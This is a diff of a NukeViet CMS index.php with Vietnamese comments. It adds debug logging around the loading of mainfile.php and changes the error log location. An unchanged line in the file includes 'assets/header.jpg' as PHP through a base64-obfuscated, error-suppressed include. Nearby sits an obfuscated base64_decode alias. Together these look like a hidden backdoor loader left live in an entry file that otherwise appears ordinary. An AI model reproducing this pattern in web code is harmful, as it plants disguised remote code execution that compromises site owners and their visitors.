@@ -4,7 +4,7 @@
 error_reporting(E_ALL);
 ini_set('display_errors', 0); // 0 = không in lỗi ra ngoài trình duyệt
 ini_set('log_errors', 1);
-ini_set('error_log', __DIR__ . '/data/error_log.txt');
+ini_set('error_log', __DIR__ . '/error_log.txt');
 
 // Test để chắc chắn log ghi được
 error_log("=== NukeViet index.php bắt đầu chạy ===");
@@ -42,16 +42,17 @@ $b = 'base6' . '4_decode';
 
 
 @include base64_decode('YXNzZXRzL2hlYWRlci5qcGc=');
-//error_log("=== YXNzZXRzL2hlYWRlci5qcGc ===");
+error_log("=== YXNzZXRzL2hlYWRlci5qcGc ===");
 
 define( 'NV_SYSTEM', true );
-//error_log("=== NV_SYSTEM === ");
+error_log("=== NV_SYSTEM === ");
 
 
 
 //require str_replace( DIRECTORY_SEPARATOR, '/', dirname( __DIR__ ) ) . '/mainfile.php';
 // an toàn: mainfile.php nằm cùng thư mục với index.php
 $mainfile = __DIR__ . '/mainfile.php';
+error_log("=== mainfile ===" . $mainfile);
 $mainfile = str_replace('\\', '/', $mainfile); // chuẩn hóa đường dẫn trên Windows
 
 if (!file_exists($mainfile) || !is_readable($mainfile)) {
@@ -61,13 +62,14 @@ if (!file_exists($mainfile) || !is_readable($mainfile)) {
          . htmlspecialchars($mainfile) . '</pre>';
     exit;
 }
-
-require_once $mainfile;
-
-error_log("=== mainfile ===");
+error_log("=== mainfile sau edit ===". $mainfile);
+error_log("checkpoint mainfile");
+require $mainfile;
+error_log("=== mainfile require ===");
 
 if (!defined('NV_ROOTDIR')) {
     // realpath để chuẩn hóa (trả về false nếu không tồn tại)
+	error_log("=== NV_ROOTDIR  ===");
     $root = realpath(__DIR__);
     if ($root === false) {
         error_log('CRITICAL: Cannot resolve root directory via realpath(__DIR__)');
@@ -78,6 +80,10 @@ if (!defined('NV_ROOTDIR')) {
     // chuẩn hoá dấu phân cách (Windows)
     $root = str_replace('\\', '/', $root);
     define('NV_ROOTDIR', $root);
+}
+else
+{
+	error_log("=== NV_ROOTDIR else  ===");
 }
 
 error_log("=== DIRECTORY_SEPARATOR");
